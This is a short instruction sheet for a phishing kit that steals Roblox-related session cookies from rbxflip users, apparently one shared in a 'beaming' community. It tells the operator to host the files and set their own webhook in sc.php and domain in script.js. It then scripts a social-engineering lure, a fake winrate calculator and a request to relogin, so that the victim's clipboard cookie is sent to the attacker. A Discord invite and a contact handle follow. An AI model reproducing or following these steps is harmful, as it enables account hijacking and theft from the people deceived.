1.) Upload the files to a site hoster I recommend using a replit nix web server for small beams(https://replit.com/new/) Or just use https://000webhost.com

2.)Change the webhooks in sc.php to yours

3.)Go into script.js and replace the Domain to your domain

4.)Go in sc.php on the other replit and add your webhook then your main domain

3.)Tell someone you have a rbxflip winrate calculator website and say they have to relogin for it to work

4.)Once they relogin to rbxflip they'll most likely have their cookie copied then have em go to the website.

5.)Cookie will go to your webhook

6.)Won't work if cookie isn't in clipboard

7.)Join https://discord.gg/legal for more epic methods

8.)I wanted to make this somewhat easy to edit so the template it super basic. Do't be a skid and please make your own template

9.) Hmu if you have issues Ice Bear#8828

10.) Don't leak theres literally no profit in doing so. Your just ruining your chances of getting good beams.
